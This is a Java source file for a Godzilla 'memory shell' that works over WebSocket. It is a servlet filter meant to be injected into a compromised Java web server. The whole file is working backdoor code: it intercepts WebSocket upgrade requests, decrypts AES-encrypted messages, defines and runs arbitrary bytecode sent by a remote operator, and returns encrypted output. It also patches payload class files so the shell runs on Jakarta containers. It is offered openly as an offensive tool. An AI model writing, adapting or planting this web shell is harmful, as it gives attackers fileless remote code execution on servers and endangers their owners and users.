package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.nio.charset.Charset;

/**
 * 不依赖容器 WebSocket 实现的 Godzilla 内存马。
 * <p>
 * 继承 ClassLoader 用于直接 defineClass 客户端下发的 payload；握手与帧协议由注入器内置的
 * helper 接管连接器 socket，本类只处理加解密与 payload 调用。
 *
 * @author ReaJason
 */
public class GodzillaRawWebSocket extends ClassLoader implements Filter {

    private static final Charset UTF8 = Charset.forName("UTF-8");

    public static String key;

    private static Class<?> payload;
    private static Method sendBinaryMethod;

    private final Class<?> helperClass;

    public GodzillaRawWebSocket() {
        this(resolveHelperClass(GodzillaRawWebSocket.class));
    }

    public GodzillaRawWebSocket(ClassLoader parent) {
        super(parent);
        this.helperClass = null;
    }

    public GodzillaRawWebSocket(Class<?> helperClass) {
        this.helperClass = helperClass;
    }

    /**
     * 后缀必须与 RawWsHelperNames.HELPER_SUFFIX 一致；模板运行时不能依赖 api jar。
     */
    private static Class<?> resolveHelperClass(Class<?> shellClass) {
        try {
            return Class.forName(shellClass.getName() + "$RawWsHelper", false, shellClass.getClassLoader());
        } catch (Throwable ignored) {
            return null;
        }
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        if (!(request instanceof HttpServletRequest) || !(response instanceof HttpServletResponse)) {
            chain.doFilter(request, response);
            return;
        }
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String wsKey = httpRequest.getHeader("Sec-WebSocket-Key");
        if (wsKey == null || !"GET".equalsIgnoreCase(httpRequest.getMethod())) {
            chain.doFilter(request, response);
            return;
        }
        String version = httpRequest.getHeader("Sec-WebSocket-Version");
        if (version != null && !"13".equals(version.trim())) {
            HttpServletResponse httpResponse = (HttpServletResponse) response;
            httpResponse.setStatus(426);
            httpResponse.setHeader("Sec-WebSocket-Version", "13");
            return;
        }
        if (helperClass != null) {
            try {
                Object helper = helperClass.newInstance();
                if (helper.equals(new Object[]{request, response, this})) {
                    return;
                }
            } catch (Throwable ignored) {
            }
        }
        chain.doFilter(request, response);
    }

    public void onStart(Object helper) {
    }

    public void onReadBinary(Object helper, byte[] message) {
        byte[] result;
        try {
            byte[] data = x(message, false);
            if (payload == null || (data.length > 1 && data[0] == -54 && data[1] == -2)) {
                data = patchPayloadNamespace(data);
                payload = new GodzillaRawWebSocket(Thread.currentThread().getContextClassLoader())
                        .defineClass(data, 0, data.length);
                result = "ok".getBytes(UTF8);
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.toString();
                result = arrOut.toByteArray();
            }
        } catch (Throwable e) {
            result = getErrorMessage(e).getBytes(UTF8);
        }
        try {
            sendBinary(helper, x(result, true));
        } catch (Throwable ignored) {
        }
    }

    public void onReadText(Object helper, String text) {
        onReadBinary(helper, text.getBytes(UTF8));
    }

    public void onDisconnect(Object helper) {
    }

    @SuppressWarnings("all")
    public Class<?> Q(byte[] cb) {
        cb = patchPayloadNamespace(cb);
        return defineClass(cb, 0, cb.length);
    }

    /**
     * Godzilla 4.01 WebSocket 插件下发的 payload（WebSocketHandler）在 handlePayloadContext 里
     * 硬编码 checkcast javax.websocket.Session。jakarta 容器没有该类，解析时抛 NoClassDefFoundError；
     * 它是 Error，payload 内的 catch (Exception) 兜不住，整个调用链直接失败。
     * 在 defineClass 前把 payload 常量池里的 javax/websocket 改成 jakarta/websocket：
     * 只在 javax.websocket.Session 缺失、jakarta.websocket.Session 存在时生效，javax 容器原样返回。
     */
    static byte[] patchPayloadNamespace(byte[] data) {
        try {
            if (!needsJakartaShift() || !containsNeedle(data)) {
                return data;
            }
            return rewriteConstantPool(data);
        } catch (Throwable ignored) {
            return data;
        }
    }

    private static final byte[] JAVAX_WEBSOCKET = "javax/websocket".getBytes(UTF8);
    private static final byte[] JAKARTA_WEBSOCKET = "jakarta/websocket".getBytes(UTF8);

    private static int jakartaShift = -1;

    private static boolean needsJakartaShift() {
        if (jakartaShift == -1) {
            ClassLoader classLoader = GodzillaRawWebSocket.class.getClassLoader();
            if (!classExists("javax.websocket.Session", classLoader)
                    && classExists("jakarta.websocket.Session", classLoader)) {
                jakartaShift = 1;
            } else {
                jakartaShift = 0;
            }
        }
        return jakartaShift == 1;
    }

    private static boolean classExists(String name, ClassLoader classLoader) {
        try {
            Class.forName(name, false, classLoader);
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean containsNeedle(byte[] data) {
        return indexOf(data, 0, data.length, JAVAX_WEBSOCKET) >= 0;
    }

    /**
     * 只重写常量池 Utf8 项，其余字节原样拷贝；needle 为纯 ASCII，不会撞上 modified UTF-8 的多字节序列。
     */
    private static byte[] rewriteConstantPool(byte[] data) {
        int cpCount = u2(data, 8);
        ByteArrayOutputStream out = new ByteArrayOutputStream(data.length + 64);
        out.write(data, 0, 10);
        int pos = 10;
        boolean changed = false;
        for (int i = 1; i < cpCount; i++) {
            int tag = data[pos] & 0xFF;
            if (tag == 1) {
                int len = u2(data, pos + 1);
                byte[] entry = new byte[len];
                System.arraycopy(data, pos + 3, entry, 0, len);
                byte[] replaced = replaceAll(entry, JAVAX_WEBSOCKET, JAKARTA_WEBSOCKET);
                if (replaced != null) {
                    entry = replaced;
                }
                if (entry.length != len) {
                    changed = true;
                    out.write(1);
                    out.write((entry.length >>> 8) & 0xFF);
                    out.write(entry.length & 0xFF);
                    out.write(entry, 0, entry.length);
                } else {
                    out.write(data, pos, 3 + len);
                }
                pos += 3 + len;
            } else {
                int size = tagSize(tag);
                if (size < 0) {
                    throw new IllegalArgumentException("unknown constant pool tag " + tag);
                }
                out.write(data, pos, size);
                pos += size;
                if (tag == 5 || tag == 6) {
                    i++;
                }
            }
        }
        out.write(data, pos, data.length - pos);
        return changed ? out.toByteArray() : data;
    }

    private static int tagSize(int tag) {
        switch (tag) {
            case 7:
            case 8:
            case 16:
            case 19:
            case 20:
                return 3;
            case 15:
                return 4;
            case 3:
            case 4:
            case 9:
            case 10:
            case 11:
            case 12:
            case 17:
            case 18:
                return 5;
            case 5:
            case 6:
                return 9;
            default:
                return -1;
        }
    }

    private static int u2(byte[] data, int pos) {
        return ((data[pos] & 0xFF) << 8) | (data[pos + 1] & 0xFF);
    }

    private static int indexOf(byte[] data, int off, int len, byte[] needle) {
        int end = off + len - needle.length;
        for (int i = off; i <= end; i++) {
            boolean found = true;
            for (int j = 0; j < needle.length; j++) {
                if (data[i + j] != needle[j]) {
                    found = false;
                    break;
                }
            }
            if (found) {
                return i;
            }
        }
        return -1;
    }

    private static byte[] replaceAll(byte[] entry, byte[] from, byte[] to) {
        ByteArrayOutputStream out = null;
        int last = 0;
        int i = 0;
        while (i <= entry.length - from.length) {
            int hit = indexOf(entry, i, entry.length - i, from);
            if (hit < 0) {
                break;
            }
            if (out == null) {
                out = new ByteArrayOutputStream();
            }
            out.write(entry, last, hit - last);
            out.write(to, 0, to.length);
            i = hit + from.length;
            last = i;
        }
        if (out == null) {
            return null;
        }
        out.write(entry, last, entry.length - last);
        return out.toByteArray();
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    private static void sendBinary(Object helper, byte[] data) {
        try {
            Method method = sendBinaryMethod;
            if (method == null) {
                method = helper.getClass().getMethod("sendBinary", byte[].class);
                sendBinaryMethod = method;
            }
            method.invoke(helper, data);
        } catch (Throwable ignored) {
        }
    }

    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
